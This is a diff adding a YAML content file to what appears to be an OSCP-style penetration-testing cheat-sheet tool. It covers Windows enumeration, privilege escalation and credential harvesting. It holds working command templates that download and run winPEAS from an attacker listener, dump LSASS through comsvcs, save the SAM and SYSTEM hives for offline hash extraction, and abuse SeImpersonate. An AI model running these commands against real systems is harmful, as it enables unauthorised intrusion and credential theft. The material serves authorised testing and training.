@@ -1,0 +1,223 @@
+# Cephalo content — Windows realm (core seed)
+# Authorized testing only. PowerShell/cmd templates are hand-quoted (the |quote
+# filter is bash-only, §5.3). Backslashes are doubled for YAML.
+sections:
+  - id: win.p2
+    title: Windows Enumeration
+    os: windows
+    phase: enumeration
+    order: 200
+    description: Local situational awareness on a foothold host.
+    techniques: [win.enum.system, win.enum.winpeas]
+    packs: [oscp]
+  - id: win.p6
+    title: Windows Privilege Escalation
+    os: windows
+    phase: privilege-escalation
+    order: 260
+    description: SYSTEM via service misconfig, token privileges, and stored creds.
+    techniques: [win.privesc.services, win.privesc.token, win.privesc.creds]
+    packs: [oscp]
+
+techniques:
+  - id: win.enum.system
+    title: System situational awareness
+    os: [windows]
+    phase: enumeration
+    summary: Who am I, what privileges, what patch level, what is installed.
+    body: |
+      The first five minutes on a Windows foothold: identity and privileges
+      (`whoami /all`), patch level (`systeminfo`), and local users/groups.
+    commands: [win.enum.whoami, win.enum.systeminfo]
+    tags: [enumeration, privesc]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.lolbas]
+    confidence: verified
+    packs: [oscp]
+
+  - id: win.enum.winpeas
+    title: Run winPEAS
+    os: [windows]
+    phase: privilege-escalation
+    summary: Automated Windows privilege-escalation enumeration.
+    commands: [win.enum.winpeas.run]
+    tags: [privesc, enumeration]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.winpeas]
+    confidence: verified
+    packs: [oscp]
+
+  - id: win.privesc.services
+    title: Service misconfiguration
+    os: [windows]
+    phase: privilege-escalation
+    summary: Unquoted service paths and weak service permissions to SYSTEM.
+    body: |
+      Two classic wins: an unquoted service path with a writable parent dir, and
+      a service whose binary/config you can modify (`sc config binPath=`).
+    commands: [win.privesc.services.unquoted, win.privesc.services.perms]
+    tags: [privesc, token-impersonation]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.lolbas, ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+  - id: win.privesc.token
+    title: Token-privilege abuse (SeImpersonate)
+    os: [windows]
+    phase: privilege-escalation
+    summary: With SeImpersonate/SeAssignPrimaryToken, impersonate to SYSTEM.
+    body: |
+      Service accounts often hold SeImpersonatePrivilege. A "Potato"-family tool
+      coerces a SYSTEM token. The exact variant/CLSID is OS-build-specific — match
+      it to the target build; never assume a CLSID.
+    commands: [win.privesc.token.check, win.privesc.token.potato]
+    tags: [token-impersonation, privesc]
+    archetypeBand: high
+    references: [ref.lolbas, ref.hacktricks]
+    confidence: unverified
+    packs: [oscp]
+
+  - id: win.privesc.creds
+    title: Credential harvesting
+    os: [windows]
+    phase: post-exploitation
+    summary: Pull secrets from LSASS, SAM, and DPAPI once elevated.
+    body: |
+      With local admin/SYSTEM, dump LSASS (mimikatz/comsvcs), the local SAM, and
+      DPAPI-protected secrets. Feed NT hashes back into the AD lateral cards.
+    commands: [win.privesc.creds.lsass, win.privesc.creds.sam]
+    tags: [pass-the-hash, mimikatz, credential-access]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.mimikatz, ref.ms-dpapi]
+    confidence: verified
+    packs: [oscp]
+    relatedIds: [ad.lateral.psexec]
+
+commands:
+  - id: win.enum.whoami
+    title: Identity + privileges
+    template: "whoami /all"
+    shell: cmd
+    description: Current user, groups, and — crucially — token privileges.
+    os: [windows]
+    phase: enumeration
+    tags: [enumeration]
+    confidence: verified
+    references: [ref.lolbas]
+    danger: low
+    packs: [oscp]
+  - id: win.enum.systeminfo
+    title: Patch level + architecture
+    template: "systeminfo"
+    shell: cmd
+    description: OS build, hotfixes, and architecture for exploit matching.
+    os: [windows]
+    phase: enumeration
+    tags: [enumeration]
+    confidence: verified
+    references: [ref.lolbas]
+    danger: low
+    packs: [oscp]
+
+  - id: win.enum.winpeas.run
+    title: winPEAS (in-memory)
+    template: "iwr -uri http://{{LHOST}}/winPEASany.exe -outfile $env:TEMP\\wp.exe; & $env:TEMP\\wp.exe"
+    shell: powershell
+    description: Download and run winPEAS from your listener.
+    os: [windows]
+    phase: privilege-escalation
+    tags: [privesc, enumeration]
+    notes:
+      - "Noisy; AV may flag. Use the obfuscated/quiet build if needed."
+    confidence: verified
+    references: [ref.winpeas]
+    danger: medium
+    packs: [oscp]
+
+  - id: win.privesc.services.unquoted
+    title: Find unquoted service paths
+    template: "wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\""
+    shell: cmd
+    description: List auto-start services with unquoted, non-system binary paths.
+    os: [windows]
+    phase: privilege-escalation
+    tags: [privesc]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+  - id: win.privesc.services.perms
+    title: Check service binary permissions
+    template: "sc qc {{TARGET_USER}}"
+    shell: cmd
+    description: Inspect a service's config/binary path to spot a writable target.
+    os: [windows]
+    phase: privilege-escalation
+    tags: [privesc]
+    notes:
+      - "If you can modify binPath= or the binary, you can run as the service account."
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: medium
+    packs: [oscp]
+
+  - id: win.privesc.token.check
+    title: Check token privileges
+    template: "whoami /priv"
+    shell: cmd
+    description: Look for SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege.
+    os: [windows]
+    phase: privilege-escalation
+    tags: [token-impersonation, privesc]
+    confidence: verified
+    references: [ref.lolbas]
+    danger: low
+    packs: [oscp]
+  - id: win.privesc.token.potato
+    title: Potato impersonation (pointer)
+    template: "# select the Potato variant matching the target Windows build, then trigger SYSTEM"
+    shell: text
+    description: Coerce a SYSTEM token via SeImpersonate — variant is build-specific.
+    os: [windows]
+    phase: privilege-escalation
+    tags: [token-impersonation, privesc]
+    notes:
+      - "The correct Potato variant/CLSID depends on the exact OS build — confirm, never guess."
+    confidence: unverified
+    references: [ref.hacktricks, ref.lolbas]
+    danger: high
+    packs: [oscp]
+
+  - id: win.privesc.creds.lsass
+    title: Dump LSASS (comsvcs)
+    template: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Windows\\Temp\\l.dmp full"
+    shell: powershell
+    description: LOLBAS LSASS dump via comsvcs MiniDump; parse offline with pypykatz.
+    os: [windows]
+    phase: post-exploitation
+    tags: [mimikatz, credential-access]
+    notes:
+      - "Requires SeDebug/admin. Parse the dump offline (pypykatz) to avoid AV on-host."
+    confidence: verified
+    references: [ref.mimikatz, ref.lolbas]
+    danger: critical
+    packs: [oscp]
+  - id: win.privesc.creds.sam
+    title: Dump SAM + SYSTEM hives
+    template: "reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save"
+    shell: cmd
+    description: Save the registry hives; extract local hashes offline with secretsdump.
+    os: [windows]
+    phase: post-exploitation
+    tags: [pass-the-hash, credential-access]
+    notes:
+      - "Offline: impacket-secretsdump -sam sam.save -system system.save LOCAL"
+    confidence: verified
+    references: [ref.impacket]
+    danger: high
+    packs: [oscp]
